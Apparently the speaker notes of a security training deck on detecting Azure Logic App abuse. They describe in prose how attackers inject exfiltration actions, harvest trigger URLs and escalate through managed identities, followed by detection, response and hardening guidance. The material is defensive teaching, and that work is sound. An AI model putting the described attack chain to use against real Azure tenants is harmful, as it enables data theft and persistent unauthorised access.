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FD8FE8-F881-4950-A3D2-22929D4A4684}"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939093-D362-400D-A064-E717E5D7522A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3719541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Module 03. We shift from identity-layer attacks to Azure resource-layer attacks. Logic Apps are serverless automation workflows that attackers abuse for data exfiltration, privilege escalation through managed identities, and persistence via timer triggers. The detection surface is primarily AzureActivity - the Azure control plane log. This module teaches you to detect when someone modifies a workflow definition, harvests a trigger URL, or escalates privileges through managed identity manipulation.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{34939093-D362-400D-A064-E717E5D7522A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>1</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2647355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module covers three attack vectors that chain together: an attacker with Contributor access edits a Logic App to inject exfiltration actions, harvests the trigger URL for credential-free invocation, and abuses the Logic App's managed identity to access sensitive resources. We'll walk through each attack, then cover the AzureActivity-based detection queries, and finish with incident response and hardening. The hardening section includes Key Vault secret management and secure inputs/outputs - practical controls students can implement immediately.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{34939093-D362-400D-A064-E717E5D7522A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>2</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1375846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module covers three attack vectors that chain together: an attacker with Contributor access edits a Logic App to inject exfiltration actions, harvests the trigger URL for credential-free invocation, and abuses the Logic App's managed identity to access sensitive resources. We'll walk through each attack, then cover the AzureActivity-based detection queries, and finish with incident response and hardening. The hardening section includes Key Vault secret management and secure inputs/outputs - practical controls students can implement immediately.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{34939093-D362-400D-A064-E717E5D7522A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>3</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="689128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Logic App abuse maps to six MITRE techniques across four tactics: execution, exfiltration, privilege escalation, and persistence. T1648 (Serverless Execution) is the core - Logic Apps execute code without the attacker needing to maintain infrastructure. T1020 and T1567 cover the exfiltration via HTTP connectors. T1548 covers the managed identity abuse for privilege escalation. T1053 covers timer-triggered persistence. T1098 covers RBAC manipulation for long-term access.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{34939093-D362-400D-A064-E717E5D7522A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>4</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="23320005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Logic App abuse maps to six MITRE techniques across four tactics: execution, exfiltration, privilege escalation, and persistence. T1648 (Serverless Execution) is the core - Logic Apps execute code without the attacker needing to maintain infrastructure. T1020 and T1567 cover the exfiltration via HTTP connectors. T1548 covers the managed identity abuse for privilege escalation. T1053 covers timer-triggered persistence. T1098 covers RBAC manipulation for long-term access.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{34939093-D362-400D-A064-E717E5D7522A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>5</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="566210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key insight is that Logic Apps combine code execution, credential access, and external connectivity in a single resource that's often under-monitored. Contributor is the most common misconfiguration - it grants workflow write permissions alongside everything else. An attacker who compromises a Contributor account can immediately edit any Logic App in the resource group. The JSON definition is the attack surface - injecting an HTTP action takes seconds. Logic App Operator is the safe role for operations teams who just need to enable/disable workflows.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{34939093-D362-400D-A064-E717E5D7522A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>6</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1500520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key insight is that Logic Apps combine code execution, credential access, and external connectivity in a single resource that's often under-monitored. Contributor is the most common misconfiguration - it grants workflow write permissions alongside everything else. An attacker who compromises a Contributor account can immediately edit any Logic App in the resource group. The JSON definition is the attack surface - injecting an HTTP action takes seconds. Logic App Operator is the safe role for operations teams who just need to enable/disable workflows.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{34939093-D362-400D-A064-E717E5D7522A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>7</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3429621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this attack step by step. The attacker starts with enumeration - listing all Logic Apps in the resource group. Then they download the workflow definition, which is just JSON. They inject a new HTTP action that sends data to their server. The upload generates a workflows/write event in AzureActivity - this is our primary detection signal. The final step - granting themselves Logic App Contributor - creates persistence that survives credential rotation. In the lab, students will see these AzureActivity events and trace the attack chain.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{34939093-D362-400D-A064-E717E5D7522A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="700187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Walk through this attack step by step. The attacker starts with enumeration - listing all Logic Apps in the resource group. Then they download the workflow definition, which is just JSON. They inject a new HTTP action that sends data to their server. The upload generates a workflows/write event in AzureActivity - this is our primary detection signal. The final step - granting themselves Logic App Contributor - creates persistence that survives credential rotation. In the lab, students will see these AzureActivity events and trace the attack chain.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{34939093-D362-400D-A064-E717E5D7522A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>9</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1704350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subtle but powerful attack vector. The SAS-signed trigger URL is essentially a bearer token for the Logic App. Once harvested, the attacker can invoke the workflow from anywhere, at any time, without any Azure credentials. They can even embed it in a phishing document so the victim triggers the workflow unknowingly. The detection signal is the listCallbackUrl operation in AzureActivity. If you see someone retrieving trigger URLs for workflows they didn't create, investigate immediately. Remediation requires regenerating the trigger URL - simply revoking the user's access doesn't invalidate existing URLs.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{34939093-D362-400D-A064-E717E5D7522A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>10</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4977998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is a subtle but powerful attack vector. The SAS-signed trigger URL is essentially a bearer token for the Logic App. Once harvested, the attacker can invoke the workflow from anywhere, at any time, without any Azure credentials. They can even embed it in a phishing document so the victim triggers the workflow unknowingly. The detection signal is the listCallbackUrl operation in AzureActivity. If you see someone retrieving trigger URLs for workflows they didn't create, investigate immediately. Remediation requires regenerating the trigger URL - simply revoking the user's access doesn't invalidate existing URLs.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{34939093-D362-400D-A064-E717E5D7522A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>11</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1160744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where Logic App abuse becomes privilege escalation. The attacker may only have Contributor on the resource group, but if a Logic App's managed identity has Key Vault Secrets User, Storage Blob Data Contributor, or Graph permissions, the attacker effectively inherits those permissions by redirecting the workflow's actions. This is why separating Logic App Contributor from Managed Identity Operator roles is critical - you don't want the same identity able to both edit workflows AND assign managed identities.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{34939093-D362-400D-A064-E717E5D7522A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>12</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="149592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where Logic App abuse becomes privilege escalation. The attacker may only have Contributor on the resource group, but if a Logic App's managed identity has Key Vault Secrets User, Storage Blob Data Contributor, or Graph permissions, the attacker effectively inherits those permissions by redirecting the workflow's actions. This is why separating Logic App Contributor from Managed Identity Operator roles is critical - you don't want the same identity able to both edit workflows AND assign managed identities.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{34939093-D362-400D-A064-E717E5D7522A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>13</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2316269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your detection cheat sheet for Logic App abuse. The six OperationName values cover the entire attack surface: workflow edits, deletions, trigger URL harvesting, manual runs, and RBAC changes. The Caller field shows the UPN or service principal that performed the action. CallerIpAddress shows where the call came from. Authorization contains the RBAC action and scope. Focus on workflows/write as the primary detection signal - every workflow edit generates this event. Combined with listCallbackUrl and roleAssignments/write in the same time window, you have a complete attack chain.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{34939093-D362-400D-A064-E717E5D7522A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>14</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13724043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your detection cheat sheet for Logic App abuse. The six OperationName values cover the entire attack surface: workflow edits, deletions, trigger URL harvesting, manual runs, and RBAC changes. The Caller field shows the UPN or service principal that performed the action. CallerIpAddress shows where the call came from. Authorization contains the RBAC action and scope. Focus on workflows/write as the primary detection signal - every workflow edit generates this event. Combined with listCallbackUrl and roleAssignments/write in the same time window, you have a complete attack chain.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{34939093-D362-400D-A064-E717E5D7522A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>15</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1374543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your baseline query. Run it over 30 days to establish who normally edits Logic Apps in your environment. In a well-managed environment, workflow edits should come from DevOps pipeline service principals, not individual user accounts. Any interactive user account editing a workflow warrants investigation - they should be using the CI/CD pipeline. Look at the CallerIpAddress too - edits from unusual IPs or outside business hours are additional signals.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{34939093-D362-400D-A064-E717E5D7522A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>16</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="137129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effective anomaly detection query in this module. It builds a 90-day baseline of known workflow editors, then finds anyone who edited a workflow in the last 30 days who was NOT in that baseline. These first-time editors are your highest-priority investigation targets. In a mature environment, this query should return zero results most of the time - new editors should go through an onboarding process. Any result warrants immediate investigation: who is this person, why are they editing Logic Apps, and did they have authorization?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{34939093-D362-400D-A064-E717E5D7522A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>17</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2355293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effective anomaly detection query in this module. It builds a 90-day baseline of known workflow editors, then finds anyone who edited a workflow in the last 30 days who was NOT in that baseline. These first-time editors are your highest-priority investigation targets. In a mature environment, this query should return zero results most of the time - new editors should go through an onboarding process. Any result warrants immediate investigation: who is this person, why are they editing Logic Apps, and did they have authorization?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{34939093-D362-400D-A064-E717E5D7522A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>18</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="803029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two queries catch the later stages of the attack. Trigger URL retrieval indicates an attacker preparing for credential-free invocation. RBAC changes on Logic App resources indicate privilege escalation or persistence. A single caller performing both a workflows/write AND a listCallbackUrl within the same session is a very strong attack signal. In the lab, we'll chain these queries together to reconstruct a complete Logic App abuse attack from workflow edit to trigger URL harvest to RBAC persistence.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{34939093-D362-400D-A064-E717E5D7522A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>19</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="12152863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correlation query that ties everything together. It aggregates all Logic App and RBAC operations by caller across hourly windows. If you see a single caller performing 3-4 different operation types within an hour - especially the combination of workflows/write, listCallbackUrl, and roleAssignments/write - you're looking at a complete attack chain. The make_set aggregation shows exactly which operations were performed. This query is ideal for a daily hunt or an analytics rule with a 1-hour aggregation window.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{34939093-D362-400D-A064-E717E5D7522A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>20</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="812891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Disabling the workflow is always the first step - it stops any active exfiltration immediately. Then revoke the attacker's RBAC access. The trigger URL invalidation is critical and often missed - simply revoking the attacker's Azure credentials doesn't invalidate SAS-signed trigger URLs they may have already harvested. You must regenerate the trigger. Review the run history to understand what data was exfiltrated - Logic Apps log the inputs and outputs of every action by default (unless secure inputs/outputs are enabled). Finally, rotate any secrets the workflow had access to, since the attacker may have extracted them.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{34939093-D362-400D-A064-E717E5D7522A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>21</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35316277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Disabling the workflow is always the first step - it stops any active exfiltration immediately. Then revoke the attacker's RBAC access. The trigger URL invalidation is critical and often missed - simply revoking the attacker's Azure credentials doesn't invalidate SAS-signed trigger URLs they may have already harvested. You must regenerate the trigger. Review the run history to understand what data was exfiltrated - Logic Apps log the inputs and outputs of every action by default (unless secure inputs/outputs are enabled). Finally, rotate any secrets the workflow had access to, since the attacker may have extracted them.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{34939093-D362-400D-A064-E717E5D7522A}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>22</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34620450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Disabling the workflow is always the first step - it stops any active exfiltration immediately. Then revoke the attacker's RBAC access. The trigger URL invalidation is critical and often missed - simply revoking the attacker's Azure credentials doesn't invalidate SAS-signed trigger URLs they may have already harvested. You must regenerate the trigger. Review the run history to understand what data was exfiltrated - Logic Apps log the inputs and outputs of every action by default (unless secure inputs/outputs are enabled). Finally, rotate any secrets the workflow had access to, since the attacker may have extracted them.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
